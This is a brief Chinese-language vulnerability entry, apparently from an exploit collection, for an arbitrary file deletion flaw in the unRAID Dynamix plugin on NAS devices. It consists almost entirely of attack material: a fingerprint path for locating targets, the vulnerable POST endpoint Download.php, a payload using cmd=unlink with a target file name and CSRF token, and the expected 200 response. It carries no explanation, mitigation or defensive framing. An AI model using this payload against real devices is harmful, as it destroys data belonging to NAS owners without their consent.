# NAS设备unraidDynamix插件任意文件删除漏洞

NAS ｜ 其他 ｜ —
- **指纹**：`"/webGui/images/banner.png"`
- **请求**：`POST /plugins/dynamix/include/Download.php HTTP/1.1`

**Payload**
```
csrf_token=9855BE5478D13A31&cmd=unlink&file=dudesite.txt
```
- **响应特征**：200